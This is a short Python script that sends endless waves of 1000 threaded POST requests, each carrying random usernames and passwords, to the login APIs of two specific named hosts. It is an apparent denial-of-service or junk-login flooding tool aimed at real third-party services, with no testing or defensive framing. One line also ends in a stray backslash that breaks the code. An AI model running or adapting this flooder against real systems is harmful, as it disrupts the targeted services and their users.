import json
import random
import string
import threading
import requests

url = "https://huanshu.huan.tv/api/login"
url1 = "https://huanju.huan.tv/api/login"

headers = {
    'Connection': 'keep-alive',
    'Accept': "*/*",
    'Content-Type': "application/json; charset=UTF-8",
}


def requestApi(i):
    fields = {
        'username': str(randomStr(12)),
        'password': str(randomStr(44)),
        'uuid': ''
    }
    try:
        data = requests.post(url=url, data=json.dumps(fields), headers=headers, timeout=5)\
        if i == 888:
            print(data.text)
        data = requests.post(url=url1, data=json.dumps(fields), headers=headers, timeout=5)
        if i == 888:
            print(data.text)
    except Exception as e:
        e


def randomStr(lengthStr):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(lengthStr):
        random_str += base_str[random.randint(0, length)]
    return random_str + "="


def threadSend():
    threads = []
    for t in range(1000):
        threads.append(threading.Thread(target=requestApi, args=(t,)))
    for thr in threads:
        thr.start()
    for thr in threads:
        thr.join()


if __name__ == '__main__':
    i = 0
    while True:
        threadSend()
        i = i + 1
        print(i)
